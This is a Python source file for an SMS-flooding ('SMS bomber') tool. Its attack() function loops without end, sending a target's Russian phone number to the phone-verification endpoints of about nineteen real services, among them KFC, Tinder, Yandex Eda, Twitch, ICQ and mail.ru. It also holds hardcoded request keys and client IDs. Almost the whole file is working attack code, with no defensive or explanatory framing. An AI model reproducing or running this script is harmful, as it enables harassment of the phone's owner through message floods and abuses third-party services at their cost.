import requests
import datetime


class color:
    Green = '\033[92m'
    Cyan = '\033[95m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    Red = '\033[91m'

def check(sent, sms):
    if sent == sms:
        quit()
 

def time(sent):
    a = datetime.datetime.now()
    time = (str(a.hour) + ':' + str(a.minute) + ':' +str(a.second))
    if int(sent) < 10:
    	print(color.Green + color.BOLD + str(sent) + color.END + ' sms sent!' + "         " + color.Green + color.BOLD + str(time) + color.END)
    elif int(sent) < 100:
    	print(color.Green + color.BOLD + str(sent) + color.END + ' sms sent!' + "        " + color.Green + color.BOLD + str(time) + color.END)
    elif int(sent) < 1000:
    	print(color.Green + color.BOLD + str(sent) + color.END + ' sms sent!' + "       " + color.Green + color.BOLD + str(time) + color.END)
    elif int(sent) < 10000:
    	print(color.Green + color.BOLD + str(sent) + color.END + ' sms sent!' + "      " + color.Green + color.BOLD + str(time) + color.END)
    else:
    	print(color.Green + color.BOLD + str(sent) + color.END + ' sms sent!' + "     " + color.Green + color.BOLD + str(time) + color.END)
    	


def attack(number, sms):
    number_7 = str(7) + number
    number_plus7 = str(+7) + number
    number_8 = str(8) + number
    sent = 0
    print("-" * 33)
    print('|  ' + color.Green + color.BOLD + "  amount   " + color.END + ' | ' + color.Green + color.BOLD + "     time     " + color.END + " |")
    print("-" * 33)
    while True:
        requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": number_7, "type": 2})

        sent += 1
        time(sent)
        check(sent,sms)

        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7})

        sent += 1
        time(sent)
        check(sent,sms)

        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": number_7})

        sent += 1
        time(sent)
        check(sent,sms)

        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": number_plus7, "api": 2, "email": "email","x-email": "x-email"})

        sent += 1
        time(sent)
        check(sent,sms)

        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7})

        sent += 1
        time(sent)
        check(sent,sms)

        utair = requests.post('https://b.utair.ru/api/v1/login/', data = {'login':number_8}, headers = {})

        sent += 1
        time(sent)
        check(sent,sms)

        tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":number_7}, headers = {})

        sent += 1
        time(sent)
        check(sent,sms)

        citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ number_7 +'/')

        sent += 1
        time(sent)
        check(sent,sms)

        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number_plus7})

        sent += 1
        time(sent)
        check(sent, sms)

        karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":number_7}, headers = {})

        sent += 1
        time(sent)
        check(sent, sms)

        youdrive = requests.post('https://youdrive.today/login/web/phone', data = {'phone': number, 'phone_code': '7'}, headers = {})

        sent += 1
        time(sent)
        check(sent, sms)

        sunlight = requests.post('https://api.sunlight.net/v3/customers/authorization/', json = {"phone":number_7}, headers = {})

        sent += 1
        time(sent)
        check(sent, sms)

        mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers={})

        sent += 1
        time(sent)
        check(sent, sms)

        youla = requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7}, headers = {})

        sent += 1
        time(sent)
        check(sent, sms)


        eda = requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + number_7})

        sent += 1
        time(sent)
        check(sent, sms)

        ivi = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": number_7})

        sent += 1
        time(sent)
        check(sent, sms)

        delimobile = requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": number_7, "SignupForm[device_type]": 3})

        sent += 1
        time(sent)
        check(sent, sms)

        icq = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': number_7, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})

        sent += 1
        time(sent)
        check(sent, sms)

        twitch = requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": "password1", "phone_number": number_7,"username": "username2"})

        sent += 1
        time(sent)
        check(sent, sms)
